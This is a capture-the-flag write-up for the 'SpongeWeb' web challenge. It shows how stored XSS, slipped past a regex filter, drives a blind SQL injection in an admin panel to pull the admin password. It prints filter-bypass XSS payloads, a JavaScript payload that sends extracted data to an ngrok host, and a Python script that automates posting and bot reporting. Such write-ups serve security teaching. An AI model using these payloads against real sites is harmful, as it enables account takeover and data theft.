+++
title = "SpongeWeb"
author= "sugo"
date = "2023-10-31"
+++

## Challenge

> I really like hacking.
> I really like privacy.
> And I really like spongebob.
> I combined all of them and created an anonymous sharing platform with HTML support. Feel free to share payloads, malware, and stolen credit cards ;).
>
> Btw it's called spongeweb, but it has nothing to do with this.
>
> Site: <http://spongeweb.challs.srdnlen.it>
>
> Author: @sanmatte

Also we are given the source code in a zip archive.

## Approach

By opening the website it appears to be a classic web challenge with blog-like functionality: you can create a post and it gets a unique URL, and you can report URLs to an admin to be checked out.

Trying a simple XSS like:

```html
<script>alert(1);</script>
```

doesn't work. Let's read the source code.

## Source code

We are presented with these files:

```plain
src
├── bot
│   ├── Dockerfile
│   ├── bot.js
│   ├── index.js
│   ├── package.json
│   └── views
├── challenge
│   ├── Dockerfile
│   ├── app.py
│   ├── schema.sql
│   ├── static
│   └── templates
├── docker-compose.yaml
└── proxy.conf
```

Opening `app.py` reveals a simple Flask server.
The first function that looks interesting is this one:

```python
@app.route('/thread', methods=['POST'])
def thread():
 if 'title' in request.form and 'thread' in request.form:
  title = request.form['title']
  thread = request.form['thread']
  thread = re.sub(r"<script[\s\S]*?>[\s\S]*?<\/script>", "", thread, flags=re.IGNORECASE)
  thread = re.sub(r"<img[\s\S]*?>[\s\S]*?<\/img>", "", thread, flags=re.IGNORECASE)
  thread_uuid = str(uuid4())
  cur = get_db().cursor()
  cur.execute("INSERT INTO threads ( id, title, thread) VALUES ( ?, ?, ?)", (thread_uuid, title, thread))
  get_db().commit()
  cur.close()
  return redirect(url_for('view', id=thread_uuid))
 return redirect(url_for('home')) , 400
```

We can see that the protection against `<script>` and `<img>` tag injection is done with a couple of regex.
How can we get around this protection? There are a few ways:

1. _by @fil_: simply use another tag

    ```html
    <object src=1 href=1 onerror="javascript:alert(1)"></object>
    ```

2. open [Regex101.com](https://regex101.com), paste the regex you are interested and get an explanation, plus you get to try out what matches and what doesn't. If you also realize that the substitution is performed only once, you can use this trick

    ```html
    <s<script></script>cript>alert(1);</script>
    ```

that indeed gets us a nice XSS.

We can now go back to reading `app.py`, and we encounter this function:

```python
''' ADMIN PANEL '''
@app.route('/login', methods=['GET', 'POST'])
def login():
 if 'username' in session:
  return redirect(url_for('admin'))

 if request.method == 'POST':
  username = request.form['username']
  password = request.form['password']
  cur = get_db().execute("SELECT * FROM users WHERE username = ?", (username,))
  user = cur.fetchone()
  cur.close()
  if user and (password.encode('utf-8')== user[2].encode('utf-8')):
   session['username'] = user[1]
   session['user_id'] = user[0]
   return redirect(url_for('admin'))
  else:
   flash('Invalid login credentials')
   return redirect(url_for('login'))

 return render_template('login.html')
```

We can see that Flask's `session` is used to keep the user logged in, and it unfortunately sets the cookie as `http-only`, making it inaccessible to our javascript code. Also, the SQL query we see here uses proper substitution, and it's not vulnerable to injections.

Let's keep reading.

```python
@app.route('/admin', methods=['GET', 'POST'])
def admin():
 if 'username' not in session:
  return redirect(url_for('login'))
 #view analytics
 if 'query' in request.args:
  query = request.args.get('query')
  try:
   cur = get_db().execute("SELECT count(*) FROM {0}".format(query))
  except:
   return render_template('adminPanel.html') , 500
  result = cur.fetchall()
  cur.close()
  return render_template('adminPanel.html', result=result, param=query)
 else:
  return render_template('adminPanel.html')
```

Ah ha! The SQL query here isn't written with proper substitution, it's just using Python's format string. Very well, that's a nice SQL injection.
Unluckly for us the query is `SELECT count(*) ...`, we won't get the field directly, we'll have to extract it character by character.

Let's see what else we can learn.

By reading `schema.sql` file we get the flag location:

```sql
INSERT INTO users (username, password) VALUES ('admin', 'srdnlen{REDACTED}');
```

And we can finally look at the `bot.js` and `index.js` file to find out that the bot uses `puppeteer` for automation, Chromium as a browser, that the `admin` looks at our post for 5 seconds before closing the page and that there's some kind of rate limiting on post reporting.

## Recap

To solve this challenge we have to extract the password of the `admin` user.

We have found a SQL injection in the `/admin` endpoint, which is accessible only when logged in as `admin`.
We have also found an XSS vulnerability in the blog post, and that allows us to run code in the admin browser.

A payload testing the first character of the flag with [webhook.site](https://webhook.site) shows that this approach works. Due to CORS we can only receive a pre-flight `HTTP OPTIONS` request, but we can encode the information we want as a URL parameter and be fine.

## Blind SQLI optimization

If we guess the flag character by character, we have to find the correct one among ~80 printable chars, this gives us around 40 requests for each char, on average. Thankfully mySQL offers a `HEX()` method that allows us to convert a value to a hex string. Each char is a byte, and each byte gets converted to two hex chars.

If we try to guess the next char in the hexadecimal sequence we reduce the alphabet down from ~80 to 16, which on average is 8 requests. We have twice as many characters to guess but the odds are still in our favour, bringing the average number of requests for each flag character down from ~40 to ~16.

## Final solution

We tried to guess each possible character by making a post, but it was too slow. We figured 5 seconds weren't enough to guess the whole flag from javascript, so we ended up with this code that lets the javascript find what's the next character and reports it to the server, that makes a new payload and so on. The Flask server is exposed to the internet through Ngrok.

XSS Payload:

```js
const h = '0123456789abcdef';
var flag = '7372646e6c656e7b'; // hex(srdnlen{)

h.forEach(c => {
    let guess = flag + c;
    fetch(`http://spongeweb.challs.srdnlen.it/admin?query=users WHERE hex(password) LIKE '` + guess + `%'`)
        .then(p => p.text())
        .then(t => {
            let ans = t[t.indexOf('</h2>') - 1];
            if (ans == '1') {
                fetch('https://1234-abcd.ngrok-free.app?' + encodeURIComponent(flag + c), {method: 'POST'});
            }
        });
})
```

Python webserver:

```python
from flask import *
from threading import *
import urllib.parse
from time import sleep, clock_gettime, CLOCK_MONOTONIC
import requests

app = Flask(__name__)
sleep(2)
TIMEOUT = 20
ngrok_url = 'https://05e5-2001-b07-6475-a0a-14cf-9dad-69d9-b20c.ngrok-free.app'
# ngrok_url = 'https://webhook.site/01be0cf0-1c5d-4dc6-bbe8-bd901e7ae9cd'

flag = '7372646e6c656e7b' # hex('srdnlen{')
has_responded = False

@app.route("/", methods=["GET", "POST", "OPTIONS"])
def hello_world():
    global flag
    global has_responded
    has_responded = True
    res = urllib.parse.unquote(request.url.split('?')[-1])
    flag = res
    print(f'received -> {res}')
    return Response(status=200)

def make_payload(current_flag):
    payload = f'''<s<script></script>cript>const h = Array.from('0123456789abcdef');
var flag = '{current_flag}';
h.forEach(c => {{
    let guess = flag + c;
    fetch(`http://spongeweb.challs.srdnlen.it/admin?query=users WHERE hex(password) LIKE '` + guess + `%'`)
        .then(p => p.text())
        .then(t => {{
            let ans = t[t.indexOf('</h2>') - 1];
            // console.log(t);
            if (ans == '1') {{
                fetch('https://1234-abcd.ngrok-free.app?' + encodeURIComponent(flag + c), {{method: 'POST'}});
            }}
        }});
}})</s<script></script>cript>'''
    return payload

def make_post(post):
    data = {
        'title': 'ulisse is cool',
        'thread': post,
    }
    response = requests.post('http://spongeweb.challs.srdnlen.it/thread', data=data, verify=False)
    post_url = response.url
    return post_url

def report_url(url):
    global has_responded
    has_responded = False

    data = {
        'url': url,
    }

    requests.post('http://spongeweb.challs.srdnlen.it/report/', data=data, verify=False)
    print('reported')

def try_next(flag):
    payload = make_payload(flag)
    url = make_post(payload)
    report_url(url)

def solve():
    while True:
        print(f'FLAG {flag}')
        print(f'sleeping 5...')
        sleep(5) # Avoid getting throttled
        print(f'resuming...')
        try_next(flag)
        start = clock_gettime(CLOCK_MONOTONIC)
        print('waiting response')
        while not has_responded:
            if clock_gettime(CLOCK_MONOTONIC) > start + TIMEOUT:
                print("TIMEOUT :(")
                print(start)
                print(clock_gettime(CLOCK_MONOTONIC))
                print(has_responded)
                exit()
            sleep(0.1)

a = Thread(target=solve)
a.start()
print('thread started')
```

```text
srdnlen{XSSS_cr0Ss_S1T3_sP0nG3wEb_SQLi}
```
